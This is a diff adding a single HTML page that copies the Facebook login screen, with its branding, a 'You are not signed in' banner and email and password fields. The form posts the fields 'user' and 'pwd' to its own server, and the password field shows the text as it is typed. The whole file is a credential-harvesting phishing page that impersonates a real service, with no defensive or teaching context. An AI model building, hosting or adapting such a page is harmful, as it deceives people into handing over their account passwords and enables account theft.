@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Log In to facebook</title>
+    <style>
+*{margin: 0;padding: 0;}
+.frame{
+    display: flex;
+    margin: auto;
+    background-color: rgba(0, 255, 255, 0);
+
+    height: 100vh;}
+
+.name{  display: flex;
+        color: #084feb;
+        cursor: pointer;
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        margin-bottom: 10px;}
+.frame{
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+}
+.from{width: 60vh;
+    padding: 3px;
+    padding-inline: 13px;
+    border-radius: 4px ;
+    border: 1px rgba(107, 107, 107, 0.466);
+    height: 37px;
+    margin-block: 3px;
+    background-color: rgba(104, 104, 104, 0.075);
+    }
+.btn{background-color: #1877f2;
+    font-family: sans-serif; 
+    font-weight: bold;
+    font-size: 16px;
+    width: 64vh;
+    cursor: pointer;
+}
+.forgottenPass{display: flex;
+                text-decoration: none;
+                font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
+                font-size: 14px;
+                margin-top: 10px;
+            }
+.or{display: flex;
+    margin-top: 23px;
+    flex-direction: row;
+}
+.line{color: rgba(73, 73, 73, 0.294);
+    margin-top: 9px;
+    border-color: rgba(107, 106, 106, 0.349);
+    width: 29vh;
+    height: 0.2px;
+    margin-inline: 6px;
+}
+.NewAccount{
+    display: flex;
+    background: #00a400;
+    height: 36px;
+    color: #fff;
+    line-height: 27px;
+    font-size: 14px;
+    padding: 3px 8px 2px;
+    font-weight: bold;
+    border-style: none;
+    border-radius: 4px;
+    text-align: center;
+    justify-content: center;
+    width: 30vh fit-content;
+    min-width: 29vh;
+    cursor: pointer;
+    margin-top: 15px;
+}
+footer{display: flex;
+    margin-top: 100px;
+   flex-direction: row;
+ }
+.lang{display: flex;
+    align-items: center;
+    flex-direction: column;
+    margin-inline: 8vh;
+    color: #576b95;
+    cursor: pointer;
+}
+ h3{
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    background-color: rgba(190, 113, 113, 0.664);
+    width: 100vw;
+    text-align: center;
+}
+    </style>
+</head>
+<body>
+    <form method="POST">
+        <h3>You are not signed in</h3>
+        <div class="frame">
+                <h1 class="name">facebook</h1>
+                <input class="from email" required name="user" placeholder="Email address or phone number" type="text">
+                <input class="from pass" required name="pwd" placeholder="Password" type="text">
+                <input class="from btn" type="submit" value="Login" >
+                <a class="forgottenPass" href="#" >Forgotten Password?</a>
+                <div class="or"><p><hr class="line">or<hr class="line"></p></div>
+                <input class="NewAccount" type="button" value="Create New Account">
+            <footer>   
+                <div class="1st lang">
+                    <h4>English (UK) <br>
+                    অসমীয়া <br>
+                    नेपाली <br>
+                    Português (Brasil)</h4>
+                </div>
+                <div class="2nd lang">
+                        <h4>বাংলা <br>
+                        हिन्दी <br>
+                        Español</h4>
+                </div>
+            </footer> 
+        </div>
+    </form>
+</body>
+</html>
